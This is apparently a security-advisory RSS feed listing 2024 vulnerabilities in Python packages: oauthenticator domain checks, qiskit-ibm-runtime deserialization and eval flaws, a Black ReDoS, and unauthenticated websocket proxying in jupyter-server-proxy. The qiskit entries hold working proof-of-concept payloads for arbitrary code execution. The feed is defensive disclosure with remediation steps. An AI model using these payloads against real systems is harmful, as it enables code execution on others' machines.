<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-03-21T13:01:51.582Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[oauthenticator] GoogleOAuthenticator.hosted_domain incorrectly verifies membership of an Google organization/workspace]]></title>
        <id>https://github.com/advisories/GHSA-55m3-44xf-hg4h</id>
        <link href="https://github.com/advisories/GHSA-55m3-44xf-hg4h"/>
        <updated>2024-03-20T21:37:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary-and-impact">Summary and impact</h2>
<p><a href="https://oauthenticator.readthedocs.io/en/latest/reference/api/gen/oauthenticator.google.html#oauthenticator.google.GoogleOAuthenticator.hosted_domain"><code>GoogleOAuthenticator.hosted_domain</code></a> is used to restrict what Google accounts can be authorized to access a JupyterHub. The restriction <em>is intended</em> to ensure Google accounts are part of one or more Google organizations/workspaces verified to control specified domain(s).</p>
<p>The vulnerability is that the actual restriction has been to Google accounts with emails ending with the domain. Such accounts could have been created by anyone which at one time was able to read an email associated with the domain. This was described by Dylan Ayrey (@dxa4481) in this <a href="https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of/">blog post</a> from 15th December 2023.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade to <code>oauthenticator&gt;=16.3.0</code> or restrict who can login another way, such as <a href="https://oauthenticator.readthedocs.io/en/latest/reference/api/gen/oauthenticator.google.html#oauthenticator.google.GoogleOAuthenticator.allowed_users"><code>allowed_users</code></a> or <a href="https://oauthenticator.readthedocs.io/en/latest/reference/api/gen/oauthenticator.google.html#oauthenticator.google.GoogleOAuthenticator.allowed_google_groups"><code>allowed_google_groups</code></a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-55m3-44xf-hg4h">https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-55m3-44xf-hg4h</a></li>
<li><a href="https://github.com/jupyterhub/oauthenticator/commit/5246b09675501b09fb6ed64022099b7644812f60">https://github.com/jupyterhub/oauthenticator/commit/5246b09675501b09fb6ed64022099b7644812f60</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29033">https://nvd.nist.gov/vuln/detail/CVE-2024-29033</a></li>
<li><a href="https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of">https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of</a></li>
<li><a href="https://github.com/advisories/GHSA-55m3-44xf-hg4h">https://github.com/advisories/GHSA-55m3-44xf-hg4h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-55m3-44xf-hg4h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T18:02:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[qiskit-ibm-runtime] `qiskit_ibm_runtime.RuntimeDecoder` can execute arbitrary code]]></title>
        <id>https://github.com/advisories/GHSA-x4x5-jv3x-9c7m</id>
        <link href="https://github.com/advisories/GHSA-x4x5-jv3x-9c7m"/>
        <updated>2024-03-20T21:37:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>deserializing json data using <code>qiskit_ibm_runtime.RuntimeDecoder</code> can be made to execute arbitrary code given a correctly formatted input string</p>
<h3 id="details">Details</h3>
<p><code>RuntimeDecoder</code> is supposed to be able to deserialize JSON strings containing various special types encoded via <code>RuntimeEncoder</code>. However, one can structure a malicious payload to cause the decoder to spawn a subprocess and execute arbitrary code, exploiting this block of code: <a href="https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159">https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159</a></p>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">malicious_data = {
    "__type__": "settings",
    "__module__": "subprocess",
    "__class__": "Popen",
    "__value__": {
        "args": ["echo", "hi"]
    },
}
json_str = json.dumps(malicious_data)

_ = json.loads(json_str, cls=qiskit_ibm_runtime.RuntimeDecoder)  # prints "hi" to the terminal
</code></pre>
<p>(where obviously "echo hi" can be replaced with something much more malicious)</p>
<p>notably the following also makes it through the runtime API, with <code>malicious_data</code> serialized client-side via <code>RuntimeEncoder</code> (and therefore presumably deserialized server-side via <code>RuntimeDecoder</code>?)</p>
<pre><code class="language-python">service = qiskit_ibm_runtime(&lt;ibm_cloud_credentials&gt;)
job = service.run("qasm3-runner", malicious_data)
print(job.status())  # prints "JobStatus.QUEUED"
</code></pre>
<h3 id="impact">Impact</h3>
<p>i don't know if <code>qiskit_ibm_runtime.RuntimeDecoder</code> is used server-side so this may or may not be a serious vulnerability on your end (however it's definitely a security hole for anyone using the library to deserialize third-party data)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-x4x5-jv3x-9c7m">https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-x4x5-jv3x-9c7m</a></li>
<li><a href="https://github.com/Qiskit/qiskit-ibm-runtime/commit/b78fca114133051805d00043a404b25a33835f4d">https://github.com/Qiskit/qiskit-ibm-runtime/commit/b78fca114133051805d00043a404b25a33835f4d</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29032">https://nvd.nist.gov/vuln/detail/CVE-2024-29032</a></li>
<li><a href="https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159">https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159</a></li>
<li><a href="https://github.com/advisories/GHSA-x4x5-jv3x-9c7m">https://github.com/advisories/GHSA-x4x5-jv3x-9c7m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x4x5-jv3x-9c7m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-20T15:44:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[qiskit-ibm-runtime] Dynamic Variable Evaluation in qiskit-ibm-runtime]]></title>
        <id>https://github.com/advisories/GHSA-cq96-9974-v8hm</id>
        <link href="https://github.com/advisories/GHSA-cq96-9974-v8hm"/>
        <updated>2024-03-20T15:41:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An <code>eval()</code> method exists <code>Options._get_program_inputs</code>. This is bad in any case, but especially bad because <code>Options</code> are also used server side, so this has the potential to expose arbitrary code injection in runtime containers, now or at a later time.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/Qiskit/qiskit-ibm-runtime/blob/da94a42060f1a22e6f306227deb45b70e0075723/qiskit_ibm_runtime/options/options.py#L140">https://github.com/Qiskit/qiskit-ibm-runtime/blob/da94a42060f1a22e6f306227deb45b70e0075723/qiskit_ibm_runtime/options/options.py#L140</a></p>
<h3 id="poc">PoC</h3>
<p>A local exploit would be something like</p>
<pre><code class="language-python">from qiskit import transpiler

class BadActor(transpiler.CouplingMap):
    def __str__(self):
        return "print('external code')"
</code></pre>
<p>Where <code>print("external code")</code> can be any arbitrary python code string.</p>
<p>Then if you did a normal workflow and used a specifically constructed <code>CouplingMap</code> subclass like <code>BadActor</code> above:</p>
<pre><code class="language-python">from qiskit_ibm_runtime import QiskitRuntimeService, Session, Options, Sampler
from qiskit import QuantumCircuit

cmap = BadActor.from_line(42)
service = QiskitRuntimeService()
options = Options(optimization_level=1)
options.simulator = dict(coupling_map=cmap))

bell = QuantumCircuit(2)
bell.h(0)
bell.cx(0, 1)
bell.measure_all()

with Session(service=service, backend="ibmq_qasm_simulator") as session:
    sampler = Sampler(session=session, options=options).run(bell)
</code></pre>
<p>This will print <code>external code</code></p>
<h3 id="impact">Impact</h3>
<p>Security vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-cq96-9974-v8hm">https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-cq96-9974-v8hm</a></li>
<li><a href="https://github.com/Qiskit/qiskit-ibm-runtime/commit/2e8c8c8df83ba310f52d1651a426bad879e0bd38">https://github.com/Qiskit/qiskit-ibm-runtime/commit/2e8c8c8df83ba310f52d1651a426bad879e0bd38</a></li>
<li><a href="https://github.com/advisories/GHSA-cq96-9974-v8hm">https://github.com/advisories/GHSA-cq96-9974-v8hm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cq96-9974-v8hm</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-03-20T15:41:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[black] Black vulnerable to Regular Expression Denial of Service (ReDoS)]]></title>
        <id>https://github.com/advisories/GHSA-fj7x-q9j7-g6q6</id>
        <link href="https://github.com/advisories/GHSA-fj7x-q9j7-g6q6"/>
        <updated>2024-03-20T15:24:02.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package black before 24.3.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the lines_with_leading_tabs_expanded function in the strings.py file. An attacker could exploit this vulnerability by crafting a malicious input that causes a denial of service.</p>
<p>Exploiting this vulnerability is possible when running Black on untrusted input, or if you habitually put thousands of leading tab characters in your docstrings.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21503">https://nvd.nist.gov/vuln/detail/CVE-2024-21503</a></li>
<li><a href="https://github.com/psf/black/commit/f00093672628d212b8965a8993cee8bedf5fe9b8">https://github.com/psf/black/commit/f00093672628d212b8965a8993cee8bedf5fe9b8</a></li>
<li><a href="https://github.com/psf/black/releases/tag/24.3.0">https://github.com/psf/black/releases/tag/24.3.0</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-BLACK-6256273">https://security.snyk.io/vuln/SNYK-PYTHON-BLACK-6256273</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2024-48.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2024-48.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-fj7x-q9j7-g6q6">https://github.com/advisories/GHSA-fj7x-q9j7-g6q6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fj7x-q9j7-g6q6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-19T06:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyter-server-proxy] Jupyter Server Proxy's Websocket Proxying does not require authentication]]></title>
        <id>https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</id>
        <link href="https://github.com/advisories/GHSA-w3vc-fx9p-wp4v"/>
        <updated>2024-03-20T21:38:04.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jupyter-server-proxy</code> is used to expose ports local to a Jupyter server listening to web traffic to the Jupyter server's <em>authenticated users</em> by proxying web requests and websockets. Dependent packages (<a href="https://www.wheelodex.org/projects/jupyter-server-proxy/rdepends/">partial list</a>) also use <code>jupyter-server-proxy</code> to expose other popular interactive applications (such as <a href="https://github.com/jupyterhub/jupyter-rsession-proxy">RStudio</a>, <a href="https://github.com/jupyterhub/jupyter-remote-desktop-proxy">Linux Desktop via VNC</a>, <a href="https://github.com/betatim/vscode-binder">Code Server</a>, <a href="https://github.com/holoviz/jupyter-panel-proxy">Panel</a>, etc) along with the Jupyter server. This feature is commonly used in hosted environments (such as a JupyterHub) to expose non-Jupyter interactive frontends or APIs to the user.</p>
<p><code>jupyter-server-proxy</code> did not check user authentication appropriately when proxying websockets, allowing unauthenticated access to anyone who had network access to the Jupyter server endpoint.</p>
<h2 id="impact">Impact</h2>
<p>This vulnerability can allow unauthenticated remote access to any websocket endpoint set up to be accessible via <code>jupyter-server-proxy</code>. In many cases (such as when exposing RStudio via <a href="https://github.com/jupyterhub/jupyter-rsession-proxy"><code>jupyter-rsession-proxy</code></a> or a remote Linux Desktop / VNC via <a href="https://github.com/jupyterhub/jupyter-remote-desktop-proxy"><code>jupyter-remote-desktop-proxy</code></a>), this leads to <strong>remote unauthenticated arbitrary code execution</strong>, due to how they use websockets. The websocket endpoints exposed by <code>jupyter_server</code> itself is not affected. Projects that do not rely on websockets are also not affected.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade <code>jupyter-server-proxy</code> to a patched version and restart any running Jupyter server.</p>
<p>You may not be installing <code>jupyter-server-proxy</code> directly, but have it be pulled in as a dependency (<a href="https://www.wheelodex.org/projects/jupyter-server-proxy/rdepends/">partial list of dependent packages</a>) - so you may be vulnerable even if you aren't directly depending on <code>jupyter-server-proxy</code>.</p>
<h3 id="for-jupyterhub-admins-of-tljh-installations">For JupyterHub admins of <a href="https://tljh.jupyter.org">TLJH</a> installations</h3>
<details><summary>Expand to read more</summary>

<p>To secure a tljh deployment's user servers, first check if <code>jupyter-server-proxy</code> is installed in the user environment with a vulnerable version. If it is, patch the vulnerability and consider terminating currently running user servers.</p>
<h4 id="1-check-for-vulnerability">1. Check for vulnerability</h4>
<p>As an JupyterHub admin from a terminal in a started user server, you can do:</p>
<pre><code class="language-bash">sudo -E python3 -c '
try:
    import jupyter_server_proxy
    is_vulnerable = not hasattr(jupyter_server_proxy, "__version__")
except:
    is_vulnerable = False
if is_vulnerable:
    print("WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.")
else:
    print("INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v")
'
</code></pre>
<p>Alternatively as a root user on the server where tljh is installed, you can do:</p>
<pre><code class="language-bash">sudo PATH=/opt/tljh/user/bin:${PATH} python3 -c '
try:
    import jupyter_server_proxy
    is_vulnerable = not hasattr(jupyter_server_proxy, "__version__")
except:
    is_vulnerable = False
if is_vulnerable:
    print("WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.")
else:
    print("INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v")
'
</code></pre>
<h4 id="2-patch-detected-vulnerability">2. Patch detected vulnerability</h4>
<p>As an JupyterHub admin from a terminal in a started user server, you can do:</p>
<pre><code class="language-bash">sudo -E pip install "jupyter-server-proxy&gt;=3.2.3,!=4.0.0,!=4.1.0"
</code></pre>
<p>Alternatively as a root user on the server where tljh is installed, you can do:</p>
<pre><code class="language-bash">sudo PATH=/opt/tljh/user/bin:${PATH} pip install "jupyter-server-proxy&gt;=3.2.3,!=4.0.0,!=4.1.0"
</code></pre>
<h4 id="3-consider-terminating-currently-running-user-servers">3. Consider terminating currently running user servers</h4>
<p>User servers that started before the patch was applied are still vulnerable. To ensure they aren't vulnerable any more you could forcefully terminate their servers via the JupyterHub web interface at <code>https://&lt;your domain&gt;/hub/admin</code>.</p>
</details>

<h3 id="for-jupyterhub-admins-of-z2jh-installations">For JupyterHub admins of <a href="https://z2jh.jupyter.org">Z2JH</a> installations</h3>
<details><summary>Expand to read more</summary>

<p>To secure your z2jh deployment's user servers, first consider if one or more user environments is or may be vulnerable, then ensure new user servers' aren't started with the vulnerability, and finally consider terminating currently running user servers. The steps below guide you to do so.</p>
<h4 id="1-check-for-vulnerabilities">1. Check for vulnerabilities</h4>
<p>Consider all docker images that user servers' environment may be based on. If your deployment expose a fixed set of images, you may be able to update them to non-vulnerable versions.</p>
<p>To check if an individual docker image is vulnerable, use a command like:</p>
<pre><code class="language-bash">CHECK_IMAGE=jupyter/base-notebook:2023-10-20
docker run --rm $CHECK_IMAGE python3 -c '
try:
    import jupyter_server_proxy
    is_vulnerable = not hasattr(jupyter_server_proxy, "__version__")
except:
    is_vulnerable = False
if is_vulnerable:
    print("WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.")
else:
    print("INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v")
'
</code></pre>
<p>Note that if you reference an image with a mutable tag, such as <code>quay.io/jupyter/pangeo-notebook:master</code>, you should ensure a new version is used by configuring the image pull policy so that an older vulnerable version isn't kept being used because it was already available on a Kubernetes node.</p>
<pre><code class="language-yaml">singleuser:
  image:
    name: quay.io/jupyter/pangeo-notebook
    tag: master
    # pullPolicy (a.k.a. imagePullPolicy in k8s specification) should be
    # declared to Always if you make use of mutable tags
    pullPolicy: Always
</code></pre>
<h4 id="2-patch-vulnerabilities-dynamically">2. Patch vulnerabilities dynamically</h4>
<p>If your z2jh deployment still may start vulnerable images for users, you could mount a script that checks and patches the vulnerability before the jupyter server starts.</p>
<p>Below is JupyterHub Helm chart configuration that relies on <a href="https://z2jh.jupyter.org/en/stable/resources/reference.html#singleuser-extrafiles"><code>singleuser.extraFiles</code></a> and <a href="https://z2jh.jupyter.org/en/stable/resources/reference.html#singleuser-cmd"><code>singleuser.cmd</code></a> to mount a script we use as an entrypoint to dynamically check and patch the vulnerability before jupyter server is started.</p>
<p>Unless you change it, the script will attempt to upgrade <code>jupyter-server-proxy</code> to a non-vulnerable version if needed, and error if it needs to and fails. You can adjust this behavior by adjusting the constants <code>UPGRADE_IF_VULNERABLE</code> and <code>ERROR_IF_VULNERABLE</code> inside the script.</p>
<pre><code class="language-yaml">singleuser:
  cmd:
    - /mnt/ghsa-w3vc-fx9p-wp4v/check-patch-run
    - jupyterhub-singleuser
  extraFiles:
    ghsa-w3vc-fx9p-wp4v-check-patch-run:
      mountPath: /mnt/ghsa-w3vc-fx9p-wp4v/check-patch-run
      mode: 0755
      stringData: |
        #!/usr/bin/env python3
        """
        This script is designed to check for and conditionally patch GHSA-w3vc-fx9p-wp4v
        in user servers started by a JupyterHub. The script will execute any command
        passed via arguments if provided, allowing it to wrap a user server startup call
        to `jupyterhub-singleuser` for example.

        Use and function of this script can be further discussed in
        https://github.com/jupyterhub/zero-to-jupyterhub-k8s/issues/3360.

        Script adjustments:
        - UPGRADE_IF_VULNERABLE
        - ERROR_IF_VULNERABLE

        Script patching assumptions:
        - script is run before the jupyter server starts
        - pip is available
        - pip has sufficient filesystem permissions to upgrade jupyter-server-proxy

        Read more at https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.
        """

        import os
        import subprocess
        import sys

        # adjust these to meet vulnerability mitigation needs
        UPGRADE_IF_VULNERABLE = True
        ERROR_IF_VULNERABLE = True


        def check_vuln():
            """
            Checks for the vulnerability by looking to see if __version__ is available
            as it coincides with the patched versions (3.2.3 and 4.1.1).
            """
            try:
                import jupyter_server_proxy

                return False if hasattr(jupyter_server_proxy, "__version__") else True
            except:
                return False


        def get_version_specifier():
            """
            Returns a pip version specifier for use with `--no-deps` meant to do as
            little as possible besides patching the vulnerability and remaining
            functional.
            """
            old = ["jupyter-server-proxy&gt;=3.2.3,&lt;4"]
            new = ["jupyter-server-proxy&gt;=4.1.1,&lt;5", "simpervisor&gt;=1,&lt;2"]

            try:
                if sys.version_info &lt; (3, 8):
                    return old

                from importlib.metadata import version

                jsp_version = version("jupyter-server-proxy")
                if int(jsp_version.split(".")[0]) &lt; 4:
                    return old
            except:
                pass
            return new


        def patch_vuln():
            """
            Attempts to patch the vulnerability by upgrading jupyter-server-proxy using
            pip. Returns True if the patch is applied successfully, otherwise False.
            """
            # attempt upgrade via pip, takes ~4 seconds
            proc = subprocess.run(
                [sys.executable, "-m", "pip", "--version"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            pip_available = proc.returncode == 0
            if pip_available:
                proc = subprocess.run(
                    [sys.executable, "-m", "pip", "install", "--no-deps"]
                    + get_version_specifier()
                )
                if proc.returncode == 0:
                    return True
            return False


        def main():
            if check_vuln():
                warning_or_error = (
                    "ERROR" if ERROR_IF_VULNERABLE and not UPGRADE_IF_VULNERABLE else "WARNING"
                )
                print(
                    f"{warning_or_error}: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see "
                    "https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.",
                    flush=True,
                )
                if warning_or_error == "ERROR":
                    sys.exit(1)

                if UPGRADE_IF_VULNERABLE:
                    print(
                        "INFO: Attempting to upgrade jupyter-server-proxy using pip...",
                        flush=True,
                    )
                    if patch_vuln():
                        print(
                            "INFO: Attempt to upgrade jupyter-server-proxy succeeded!",
                            flush=True,
                        )
                    else:
                        warning_or_error = "ERROR" if ERROR_IF_VULNERABLE else "WARNING"
                        print(
                            f"{warning_or_error}: Attempt to upgrade jupyter-server-proxy failed!",
                            flush=True,
                        )
                        if warning_or_error == "ERROR":
                            sys.exit(1)

            if len(sys.argv) &gt;= 2:
                print("INFO: Executing provided command", flush=True)
                os.execvp(sys.argv[1], sys.argv[1:])
            else:
                print("INFO: No command to execute provided", flush=True)


        main()
</code></pre>
<h4 id="3-consider-terminating-currently-running-user-servers-1">3. Consider terminating currently running user servers</h4>
<p>User servers that started before the patch was applied are still vulnerable. To ensure they aren't vulnerable any more you could forcefully terminate their servers via the JupyterHub web interface at <code>https://&lt;your domain&gt;/hub/admin</code>.</p>
</details>

<h2 id="simple-reproduction">Simple Reproduction</h2>
<details><summary>Expand to read more</summary>

<h3 id="setup-application-to-proxy">Setup application to proxy</h3>
<p>Make a trivial tornado app that has both websocket and regular HTTP endpoints.</p>
<pre><code class="language-python">from tornado import websocket, web, ioloop

class EchoWebSocket(websocket.WebSocketHandler):
    def open(self):
        print("WebSocket opened")

    def on_message(self, message):
        self.write_message(u"You said: " + message)

    def on_close(self):
        print("WebSocket closed")

class HiHandler(web.RequestHandler):
    def get(self):
        self.write("Hi")

app = web.Application([
    (r'/ws', EchoWebSocket),
    (r'/hi', HiHandler)
])

if __name__ == '__main__':
    app.listen(9500)
    ioloop.IOLoop.instance().start()
</code></pre>
<h3 id="setup-a-clean-environment-with-jupyter-server-proxy-and-start-a-jupyter-server-instance">Setup a clean environment with <code>jupyter-server-proxy</code> and start a <code>jupyter server</code> instance</h3>
<p>We don't need jupyterlab or anything else here, just <code>jupyter-server-proxy</code> would do.</p>
<pre><code class="language-bash">python -m venv clean-env/
source clean-env/bin/activate
pip install jupyter-server-proxy
jupyter server
</code></pre>
<h3 id="verify-http-requests-require-authentication">Verify HTTP requests require authentication</h3>
<pre><code class="language-bash">curl -L http://127.0.0.1:8888/proxy/9500/hi
</code></pre>
<p>This does <em>not</em> return the <code>Hi</code> response, as expected. Instead, you get the HTML response asking for a token.</p>
<p>This is secure as intended.</p>
<h3 id="verify-websocket-requests-doesnt-authentication">Verify websocket requests doesn't authentication</h3>
<p>The example makes use of <a href="https://github.com/vi/websocat">websocat</a> to test websockets. You can use any other tool you are familiar with too.</p>
<pre><code class="language-bash">websocat ws://localhost:8888/proxy/9500/ws
</code></pre>
<p>At the terminal, type 'Just testing' and press Enter. You'll get <code>You said: Just testing</code> without any authentication required.</p>
</details>
### References

<ul>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v">https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v</a></li>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/commit/764e499f61a87641916a7a427d4c4b1ac3f321a9">https://github.com/jupyterhub/jupyter-server-proxy/commit/764e499f61a87641916a7a427d4c4b1ac3f321a9</a></li>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/commit/bead903b7c0354b6efd8b4cde94b89afab653e03">https://github.com/jupyterhub/jupyter-server-proxy/commit/bead903b7c0354b6efd8b4cde94b89afab653e03</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28179">https://nvd.nist.gov/vuln/detail/CVE-2024-28179</a></li>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/blob/9b624c4d9507176334b46a85d94a4aa3bcd29bed/jupyter_server_proxy/handlers.py#L433">https://github.com/jupyterhub/jupyter-server-proxy/blob/9b624c4d9507176334b46a85d94a4aa3bcd29bed/jupyter_server_proxy/handlers.py#L433</a></li>
<li><a href="https://github.com/advisories/GHSA-w3vc-fx9p-wp4v">https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-03-20T15:22:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyter-server-proxy] Jupyter Server Proxy's Websocket Proxying does not require authentication]]></title>
        <id>https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</id>
        <link href="https://github.com/advisories/GHSA-w3vc-fx9p-wp4v"/>
        <updated>2024-03-20T21:38:04.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jupyter-server-proxy</code> is used to expose ports local to a Jupyter server listening to web traffic to the Jupyter server's <em>authenticated users</em> by proxying web requests and websockets. Dependent packages (<a href="https://www.wheelodex.org/projects/jupyter-server-proxy/rdepends/">partial list</a>) also use <code>jupyter-server-proxy</code> to expose other popular interactive applications (such as <a href="https://github.com/jupyterhub/jupyter-rsession-proxy">RStudio</a>, <a href="https://github.com/jupyterhub/jupyter-remote-desktop-proxy">Linux Desktop via VNC</a>, <a href="https://github.com/betatim/vscode-binder">Code Server</a>, <a href="https://github.com/holoviz/jupyter-panel-proxy">Panel</a>, etc) along with the Jupyter server. This feature is commonly used in hosted environments (such as a JupyterHub) to expose non-Jupyter interactive frontends or APIs to the user.</p>
<p><code>jupyter-server-proxy</code> did not check user authentication appropriately when proxying websockets, allowing unauthenticated access to anyone who had network access to the Jupyter server endpoint.</p>
<h2 id="impact">Impact</h2>
<p>This vulnerability can allow unauthenticated remote access to any websocket endpoint set up to be accessible via <code>jupyter-server-proxy</code>. In many cases (such as when exposing RStudio via <a href="https://github.com/jupyterhub/jupyter-rsession-proxy"><code>jupyter-rsession-proxy</code></a> or a remote Linux Desktop / VNC via <a href="https://github.com/jupyterhub/jupyter-remote-desktop-proxy"><code>jupyter-remote-desktop-proxy</code></a>), this leads to <strong>remote unauthenticated arbitrary code execution</strong>, due to how they use websockets. The websocket endpoints exposed by <code>jupyter_server</code> itself is not affected. Projects that do not rely on websockets are also not affected.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade <code>jupyter-server-proxy</code> to a patched version and restart any running Jupyter server.</p>
<p>You may not be installing <code>jupyter-server-proxy</code> directly, but have it be pulled in as a dependency (<a href="https://www.wheelodex.org/projects/jupyter-server-proxy/rdepends/">partial list of dependent packages</a>) - so you may be vulnerable even if you aren't directly depending on <code>jupyter-server-proxy</code>.</p>
<h3 id="for-jupyterhub-admins-of-tljh-installations">For JupyterHub admins of <a href="https://tljh.jupyter.org">TLJH</a> installations</h3>
<details><summary>Expand to read more</summary>

<p>To secure a tljh deployment's user servers, first check if <code>jupyter-server-proxy</code> is installed in the user environment with a vulnerable version. If it is, patch the vulnerability and consider terminating currently running user servers.</p>
<h4 id="1-check-for-vulnerability">1. Check for vulnerability</h4>
<p>As an JupyterHub admin from a terminal in a started user server, you can do:</p>
<pre><code class="language-bash">sudo -E python3 -c '
try:
    import jupyter_server_proxy
    is_vulnerable = not hasattr(jupyter_server_proxy, "__version__")
except:
    is_vulnerable = False
if is_vulnerable:
    print("WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.")
else:
    print("INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v")
'
</code></pre>
<p>Alternatively as a root user on the server where tljh is installed, you can do:</p>
<pre><code class="language-bash">sudo PATH=/opt/tljh/user/bin:${PATH} python3 -c '
try:
    import jupyter_server_proxy
    is_vulnerable = not hasattr(jupyter_server_proxy, "__version__")
except:
    is_vulnerable = False
if is_vulnerable:
    print("WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.")
else:
    print("INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v")
'
</code></pre>
<h4 id="2-patch-detected-vulnerability">2. Patch detected vulnerability</h4>
<p>As an JupyterHub admin from a terminal in a started user server, you can do:</p>
<pre><code class="language-bash">sudo -E pip install "jupyter-server-proxy&gt;=3.2.3,!=4.0.0,!=4.1.0"
</code></pre>
